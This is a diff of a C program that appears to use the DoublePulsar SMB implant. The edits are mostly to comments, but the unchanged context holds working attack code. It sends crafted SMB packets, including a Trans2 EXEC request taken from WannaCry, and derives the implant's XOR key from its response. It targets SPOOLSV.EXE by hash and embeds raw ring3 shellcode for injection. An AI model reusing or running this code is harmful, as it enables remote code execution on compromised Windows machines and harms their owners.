@@ -29,7 +29,7 @@ unsigned char SMB_TreeConnectAndX[] =
 
 unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";
 
-//Fixed Trans2 session setup PING packet.  This should work
+//Fixed SMB Trans2 session setup PING packet.  
 unsigned char trans2_request[] =
 "\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
@@ -38,7 +38,7 @@ unsigned char trans2_request[] =
 "\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00";
 
-//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
+//SMB Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
 unsigned char wannacry_Trans2_Request[] =
 "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
@@ -169,7 +169,6 @@ const char* calculate_doublepulsar_arch(uint64_t s) {
 	}
 }
 
-
 int kernel_shellcode_size = 0;
 int shellcode_one_part_len = 0;
 int shellcode_part_two_len = 0;
@@ -200,7 +199,7 @@ int main(int argc, char* argv[])
 	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	//send Session Setup AndX request
+	//send SMB Session Setup AndX request
 	printf("sending Session_Setup_AndX_Request!\n");
 	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
@@ -240,20 +239,19 @@ int main(int argc, char* argv[])
 	//update UserID in modified TreeConnect Request
 	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid in packet
 
-	//send modified TreeConnect request
+	//send modified SMB TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	//copy the treeID from the TreeConnect response
 	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
 
-	//Update treeID, UserID
+	//Update treeID, UserID in the trans2 request
 	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
 	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
 	//might need to update processid
 
-	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
-	//will return x51 or 81
+	//if DoublePulsar is enabled, the multiplex ID is incremented by 10 and will return x51 or 81
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
@@ -265,29 +263,24 @@ int main(int argc, char* argv[])
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
 	signature[4] = '\0';
-	//this is for determining architecture
-	//recvbuff[22];
-	//but unused at this time
+	//value at this offset 22 in recvbuff[22] location in the recvbuff is for determining architecture but unused at this time
 
 	//convert the signature buffer to unsigned integer 
-	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
 	sig = LE2INT(signature);
 
 	//calculate the XOR key for DoublePulsar
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
-	// Extract 8 bytes from offset 18
+	//Extract 8 bytes from offset 18
 	uint64_t arch_signature_long = 0;
 	memcpy(&arch_signature_long, recvbuff + 18, 8);
 	const char* arch = calculate_doublepulsar_arch(arch_signature_long);
 	printf("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s\n", arch);
 
-
 	const char* proc_name = "SPOOLSV.EXE";
 	uint32_t hash = generate_process_hash(proc_name);
 	printf("Process Hash for %s: 0x%08X\n", proc_name, hash);
-
 	uint32_t proc_hash = generate_process_hash(proc_name);
 
 	//Length: 780 bytes
@@ -368,7 +361,6 @@ int main(int argc, char* argv[])
 		"\xe3\x7e\xca\xff\x06\xd4\x5b\x17\x2b\x06\xee\xa2\x3f\x69"
 		"\x60\x0e\xd9\x92\x64\xd7\x63\x93\xae\xc7\x54\x28\x6d\xb6"
 		"\x56\xb1\x09\x78\xd3\x98\x0e\xd7\x3a\xd2\x27";
-
 
 	size_t ring3_len = sizeof(ring3) / sizeof(ring3[0]);
 	ring3_len -= 1;
